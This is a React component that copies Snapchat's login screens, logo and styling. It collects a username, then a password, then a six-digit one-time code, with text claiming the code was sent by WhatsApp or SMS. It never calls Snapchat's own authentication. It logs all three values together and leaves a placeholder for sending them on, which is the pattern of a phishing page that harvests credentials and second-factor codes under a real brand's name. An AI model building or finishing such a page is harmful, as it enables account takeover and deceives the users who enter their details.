import React, { useState, useRef, useEffect } from 'react';
import snaplogo from './assets/snaplogo.svg';

const SnapchatLogin = () => {
  // State management for three-screen flow
  const [currentScreen, setCurrentScreen] = useState('username'); // 'username', 'password', or 'otp'
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  
  // Refs for OTP inputs
  const otpRefs = useRef([]);

  // Username/Email Screen Submit
  const handleUsernameSubmit = (e) => {
    e.preventDefault();
    if (username.trim()) {
      setCurrentScreen('password');
    }
  };

  // Password Screen Submit
  const handlePasswordSubmit = (e) => {
    e.preventDefault();
    if (password.trim()) {
      console.log('Password submitted:', { username, password });
      setCurrentScreen('otp');
    }
  };

  // OTP Screen Submit
  const handleOtpSubmit = (e) => {
    e.preventDefault();
    const otpValue = otp.join('');
    if (otpValue.length === 6) {
      console.log('Login completed:', { username, password, otp: otpValue });
      // Add your final login logic here
    }
  };

  // Handle OTP input change
  const handleOtpChange = (index, value) => {
    // Only allow digits
    if (value && !/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  // Handle OTP input keydown
  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  // Handle "Not you?" click
  const handleNotYou = () => {
    setCurrentScreen('username');
    setPassword('');
  };

  // Auto-focus first OTP input when screen loads
  useEffect(() => {
    if (currentScreen === 'otp') {
      otpRefs.current[0]?.focus();
    }
  }, [currentScreen]);

  // Username/Email Login Screen
  if (currentScreen === 'username') {
    return (
      <div className="min-h-screen bg-[#F7F7F7] flex flex-col items-center justify-between p-4 font-sans">
        <div className="flex-1 flex items-center justify-center w-full">
          <div className="bg-white rounded-2xl shadow-lg w-full max-w-[380px] p-8 flex flex-col items-center">
            
            {/* Snapchat Ghost Logo */}
            <div className="mb-6">
              <img src={snaplogo} alt="Snapchat" className='h-20'/>
            </div>

            {/* Title */}
            <h1 className="text-[28px] font-bold text-[#2B2B2B] mb-8">
              Log in to Snapchat
            </h1>

            {/* Username/Email Form */}
            <form onSubmit={handleUsernameSubmit} className="w-full">
              <div className="mb-6">
                <label 
                  htmlFor="username" 
                  className="block text-[13px] font-medium text-[#737373] mb-2"
                >
                  Username or email
                </label>
                
                <input
                  type="text"
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full bg-[#F7F7F7] border-0 rounded-lg px-4 py-3.5 text-[15px] text-[#2B2B2B] placeholder-[#ADADAD] focus:outline-none focus:ring-2 focus:ring-[#00C3FF] transition-all"
                  placeholder=""
                />
              </div>

              {/* Toggle to Phone Login */}
              <div className="mb-8 text-center">
                <a
                  href="#"
                  className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
                >
                  Use a phone number instead
                </a>
              </div>

              {/* Next Button */}
              <button
                type="submit"
                className="w-full bg-[#00C3FF] hover:bg-[#00A8E0] text-white font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm hover:shadow-md active:scale-[0.98]"
              >
                Next
              </button>
            </form>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center text-[#737373] text-[15px] mt-6">
          Using Snapchat for the first time?{' '}
          <a href="#" className="font-semibold text-[#2B2B2B] hover:text-[#00C3FF] transition-colors">
            Sign up
          </a>
        </div>
      </div>
    );
  }

  // Password Entry Screen
  if (currentScreen === 'password') {
    return (
      <div className="min-h-screen bg-[#F7F7F7] flex items-center justify-center p-4 font-sans">
        {/* Main Card Container */}
        <div className="bg-white rounded-2xl shadow-lg w-full max-w-[380px] p-8 flex flex-col items-center">
          
          {/* Snapchat Ghost Logo */}
          <div className="mb-6">
            <img src={snaplogo} alt="Snapchat" className='h-20'/>
          </div>

          {/* Title */}
          <h1 className="text-[28px] font-bold text-[#2B2B2B] mb-8">
            Enter Password
          </h1>

          {/* Username Section */}
          <div className="mb-8 flex items-center justify-center gap-2 border border-[#E8E8E8] rounded-lg px-4 py-3">
            <span className="text-[15px] font-semibold text-[#2B2B2B]">
              {username}
            </span>
            <button
              onClick={handleNotYou}
              className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
            >
              Not you?
            </button>
          </div>

          {/* Password Input Section */}
          <form onSubmit={handlePasswordSubmit} className="w-full">
            <div className="mb-6">
              <label 
                htmlFor="password" 
                className="block text-[13px] font-medium text-[#737373] mb-2"
              >
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-[#F7F7F7] border-0 rounded-lg px-4 py-3.5 text-[15px] text-[#2B2B2B] placeholder-[#ADADAD] focus:outline-none focus:ring-2 focus:ring-[#00C3FF] transition-all pr-12"
                  placeholder=""
                />
                {/* Eye Icon */}
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-[#ADADAD] hover:text-[#737373] transition-colors"
                >
                  <svg 
                    width="20" 
                    height="20" 
                    viewBox="0 0 24 24" 
                    fill="none" 
                    stroke="currentColor" 
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    {showPassword ? (
                      <>
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                        <line x1="1" y1="1" x2="23" y2="23" />
                      </>
                    ) : (
                      <>
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                        <circle cx="12" cy="12" r="3" />
                      </>
                    )}
                  </svg>
                </button>
              </div>
            </div>

            {/* Forgot Password Link */}
            <div className="mb-8 text-center">
              <a 
                href="#" 
                className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
              >
                Forgot Password
              </a>
            </div>

            {/* Next Button */}
            <button
              type="submit"
              className="w-full bg-[#00C3FF] hover:bg-[#00A8E0] text-white font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm hover:shadow-md active:scale-[0.98]"
            >
              Next
            </button>
          </form>
        </div>
      </div>
    );
  }

  // OTP Verification Screen
  return (
    <div className="min-h-screen bg-[#F7F7F7] flex items-center justify-center p-4 font-sans">
      {/* Main Card Container */}
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-[380px] p-8 flex flex-col items-center">
        
        {/* Snapchat Ghost Logo */}
        <div className="mb-6">
          <img src={snaplogo} alt="Snapchat" className='h-20'/>
        </div>

        {/* Title */}
        <h1 className="text-[24px] font-bold text-[#2B2B2B] mb-4 text-center leading-tight">
          Verify Your Identity
        </h1>

        {/* Description */}
        <p className="text-[14px] text-[#737373] text-center mb-8 leading-relaxed px-2">
          In order to authorize the login, we have sent a 6-digit OTP on WhatsApp/SMS to your associated number
        </p>

        {/* OTP Input Section */}
        <form onSubmit={handleOtpSubmit} className="w-full">
          <div className="mb-8">
            <label className="block text-[13px] font-medium text-[#737373] mb-4 text-center">
              Enter OTP
            </label>
            
            {/* 6 OTP Input Boxes */}
            <div className="flex justify-center gap-3">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (otpRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className="w-12 h-14 text-center text-[24px] font-semibold text-[#2B2B2B] bg-transparent border-b-2 border-[#E8E8E8] focus:border-[#00C3FF] focus:outline-none transition-colors"
                />
              ))}
            </div>
          </div>

          {/* Resend OTP Link */}
          <div className="mb-8 text-center">
            <a 
              href="#" 
              className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
            >
              Resend OTP
            </a>
          </div>

          {/* Verify Button */}
          <button
            type="submit"
            disabled={otp.join('').length !== 6}
            className={`w-full font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm ${
              otp.join('').length === 6
                ? 'bg-[#00C3FF] hover:bg-[#00A8E0] text-white hover:shadow-md active:scale-[0.98]'
                : 'bg-[#E8E8E8] text-[#ADADAD] cursor-not-allowed'
            }`}
          >
            Verify
          </button>
        </form>
      </div>
    </div>
  );
};

export default SnapchatLogin;
